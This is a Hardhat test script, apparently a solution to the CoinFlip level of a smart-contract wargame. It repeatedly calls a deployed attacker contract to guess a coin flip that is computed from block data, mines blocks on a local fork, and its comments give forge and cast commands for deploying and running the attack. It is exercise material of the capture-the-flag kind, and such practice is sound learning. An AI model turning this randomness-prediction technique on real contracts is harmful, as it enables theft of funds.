import {ethers} from "hardhat"
import {mine} from "@nomicfoundation/hardhat-toolbox/network-helpers"

describe("CoinFlipAttack", function (){
    it("Should attack the CoinFlip contract", async function () {
        const challengeContractAddress = "0x201EE3C5270d9BA470457efaD5b584Af744331Fc"
        const challengeContract = await ethers.getContractAt("CoinFlip", challengeContractAddress)
        const attackContract = await ethers.getContractAt("CoinFlipAttack", "0xFe8C49004864470eD905bc1947fdFEeBF939939a")
        let currentWins = 0
        let lastHash = 0
        while(currentWins < 10){
            const blockHash = (await ethers.provider.getBlock("latest"))!.timestamp
            if(lastHash == blockHash){
                console.log("waiting for next block...")
                continue
            }
            lastHash=blockHash
            await attackContract.guessFlip(challengeContractAddress)
            currentWins = Number(await challengeContract.consecutiveWins())
            console.log("CurrentWins: ", currentWins)
            if(currentWins==0){
                console.log("guess was wrong, exiting loop")
                break
            }
            // await setTimeout(5000) // when doing this live we will wait
            await mine(1) // test only function to force mine a block
        }
        // expect(currentWins).to.be.equal(10)
    });
});
// Deployed with: `forge create CoinFlipAttack --private-key $PKEY --rpc-url $RPC_URL`
// Tested against a hardhat fork with `pnpm hardhat node --fork $RPC_URL`
// Hardhat test is run with: `pnpm hardhat test test/3CoinFlip.ts --network localhost --no-compile`
// no-compile flag is added as hardhat does not recognize imports the same as foundry,
// possibly remedied by the "hardhat-foundry" plugin

// This challenge requires calling a function multiple times over at least 10 blocks
// This cannot be accomplished due to the nature of foundry as a while loop that runs
// until the block changes would run out of memory. Instead we deploy our own attacking
// contract and call it using hardhat to wait 10 sec between calls to the attacker contract
//`cast call <attacker_address> "guessFlip(address)" <challenge_contract_address> --rpc_url $RPC_URL --private-key $PKEY` 10 times
// * changing to `cast send` will publish the transaction
// ** can use cast call <challenge_contract_address> "consecutiveWins()(uint256)" --rpc-url $RPC_URL to check current wins